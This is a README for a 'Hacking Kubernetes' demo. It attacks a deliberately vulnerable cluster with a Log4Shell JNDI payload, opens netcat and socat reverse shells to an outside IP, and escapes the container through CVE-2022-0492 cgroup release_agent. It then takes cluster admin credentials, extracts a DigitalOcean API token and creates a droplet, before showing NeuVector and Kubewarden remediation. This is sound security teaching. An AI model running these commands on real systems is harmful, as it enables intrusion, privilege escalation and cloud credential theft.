# Hacking Kubernetes - Demo

## Preparations

### Vulnerable Kubernetes Cluster

Create a single-node Kubernetes custom cluster in Rancher.

VM resources: 4 CPU, 8GB RAM, 80GB disk

OS:

* Image: http://cloud-images-archive.ubuntu.com/releases/bionic/release-20180517/ubuntu-18.04-server-cloudimg-amd64.img
* Deactivate unattended upgrades
```
sudo apt remove unattended-upgrades
```
* Install packages
```
sudo apt install apt-transport-https ca-certificates curl socat jq
```

* Install docker-ce 18.06.3~ce~3-0~ubuntu
```
sudo su
curl -fsSl "https://download.docker.com/linux/ubuntu/gpg" | apt-key add -
add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu bionic stable"
apt install docker-ce=18.06.3~ce~3-0~ubuntu
```
* Remove apparmor
```
sudo systemctl disable apparmor
sudo systemctl stop apparmor
sudo apt purge apparmor
sudo reboot
```

Cluster configuration:

* RKE1 v1.23.16
* Canal CNI
* No hardening
* No Project Network Isolation
* No PodSecurityPolicies

Install:

* cert-manager
* NeuVector (reduce controller replicas to 1)
* Kubewarden

In NeuVector:

* Activate autoscan
* Go to settings and deactivate "zero drift" for new services

Create a Secret with a DigitalOceanApi key

```
apiVersion: v1
kind: Secret
metadata:
  name: digitalocean
  namespace: kube-system
stringData:
  access-token: "..."
```

Deploy the sample application

```
kubectl apply -f vulnerable-application/deploy/
```

### Attacker VM

Create a VM that is reachable from the vulnerable cluster. All incoming ports should be open. This expects openSUSE as an OS. 

Copy exploiting app to the VM

Download jdk-8u20-linux-x64 from https://www.oracle.com/de/java/technologies/javase/javase8-archive-downloads.html

```
scp ~/Downloads/jdk-8u20-linux-x64.tar.gz ec2-user@<IP>:~/
scp -r exploiting-app/* ec2-user@<IP>:~/
```

On the VM, install the requirements

```
zypper in -y python3 socat

pip3 install -r requirements.txt

tar -xvf jdk-8u20-linux-x64.tar.gz
```

Run exploiting app

```
sudo python3 poc.py --userip <IP> --webport 80 --lport 443 &
```

Run necessary netcat and socat processes for remote shells

```
sudo nc -lvnp 443
```

```
socat file:`tty`,raw,echo=0 tcp-listen:4444
```


## Run attack

Run attack

```
curl http://sample-app.default.10.65.0.209.sslip.io/login -d "uname=test&password=invalid" -H 'User-Agent: ${jndi:ldap://18.198.55.208:1389/a}'
```

Install kubectl

```
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"; chmod +x kubectl; mv kubectl /usr/bin/
```

Test if we can access the Kubernetes API

```
kubectl get pods
```

Check capabilities

```
capsh --print
```

Try to get more capabilities (CVE-2022-0492)

```
unshare -UrmC bash
capsh --print
```

Try to break out of the container and create remote shell on host (see also https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation#privileged)

```
# Mounts the RDMA cgroup controller and create a child cgroup
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

# Enables cgroup notifications on release of the "x" cgroup
echo 1 > /tmp/cgrp/x/notify_on_release

# Finds path of OverlayFS mount for container
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`

# Sets release_agent to /{overlay_fs_host_path}/cmd
echo "$host_path/cmd" > /tmp/cgrp/release_agent

# create command to execute
echo '#!/bin/bash' > /cmd
echo "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:4444" >> /cmd
chmod a+x /cmd

# Executes the attack by spawning a process that immediately ends inside the "x" child cgroup
# By creating a /bin/sh process and writing its PID to the cgroup.procs file in "x" child cgroup directory
# The script on the host will execute after /bin/sh exits 
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

List docker containers

```
docker ps
whoami
```

Install kubectl

```
docker cp kubelet:/usr/local/bin/kubectl /usr/bin/
```

Get kubeconfig

```
kubectl --kubeconfig $(docker inspect kubelet --format '{{ range .Mounts }}{{ if eq .Destination "/etc/kubernetes" }}{{ .Source }}{{ end }}{{ end }}')/ssl/kubecfg-kube-node.yaml get configmap -n kube-system full-cluster-state -o json | jq -r .data.\"full-cluster-state\" | jq -r .currentState.certificatesBundle.\"kube-admin\".config | sed -e "/^[[:space:]]*server:/ s_:.*_: \"https://127.0.0.1:6443\"_" > kubeconfig_admin.yaml

export KUBECONFIG=$(pwd)/kubeconfig_admin.yaml
```

Get DigitalOcean API token

Get API token from secret

```
do_token=$(kubectl get secret -n kube-system digitalocean -o jsonpath="{.data.access-token}" | base64 --decode)
```

Install doctl

```
cd ~
wget https://github.com/digitalocean/doctl/releases/download/v1.94.0/doctl-1.94.0-linux-amd64.tar.gz
tar xf ~/doctl-1.94.0-linux-amd64.tar.gz
mv ~/doctl /usr/bin
```

Login

```
doctl auth init -t $do_token
```

Create VM

```
doctl compute droplet create bhofmann-demo-attacker --region fra1 --size s-1vcpu-1gb --ssh-keys	"6c:c1:a4:05:f8:7f:31:ff:42:96:70:4a:92:9f:b8:af" --image ubuntu-20-04-x64 --wait
```

Cleanup

```
doctl compute droplet delete bhofmann-demo-attacker -f
```

## Fix attack

Problems:

* Sample-app has a log4shell vulnerability which allows a remote shell into the container
* Even though the container is not privileged, we can get SYS_ADMIN capabilities due to a kernel bug, escape the container and get admin access to the cluster

NeuVector scanning tells us this:

* on node CVE-2022-0492
* on container, compliance: running as root, CVE-2021-45046

NeuVector learned a lot of processes, like unshare, mount etc
NeuVector learned a lot of network communication, like communication to external system, including our remote shell

Show security events with suspicious processes on host.

First deny `/usr/bin/socat` on host and put host into protect mode.

Execute, escape command in container again

```
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

See that socat is blocked.

Next put sample-app in protect mode and delete all learned process rules but the ones necessary for the app to work (ex, pause, dirname, java). Try to do something in remote container shell and see that it's blocked.

```
unshare -UrmC bash
```

Next remove network rules from sample-app to external.

See that the remote shell does not work anymore and the connection was denied in the security events.

Execute

```
curl http://sample-app.default.10.65.0.209.sslip.io/login -d "uname=test&password=invalid" -H 'User-Agent: ${jndi:ldap://18.198.55.208:1389/a}'
```

and see the security event.

Add a log4shell WAF rule to block the log4shell attack.

Execute

```
curl http://sample-app.default.10.65.0.209.sslip.io/login -d "uname=test&password=invalid" -H 'User-Agent: ${jndi:ldap://18.198.55.208:1389/a}'
```

and see the security event.

The container should also not run as root.

Go to Kubewarden and install the "User Group PSP" policy in the default namespace with User rule "MustRunAsNonRoot". Choose "RunAsAny" for the others. Highlight other policies (e.g. no privileged pods).

Once the policy is deployed.

Delete the pod and show the error.

## Credits

The vulnerable application is adapted from https://github.com/kozmer/log4j-shell-poc
The talk was inspired by https://github.com/nmeisenzahl/hijack-kubernetes. This talk has a very a different focus. It shows exploiting a vulnerability that works without misconfiguration, only because of outdated versions and focuses in more detail on remediation. 
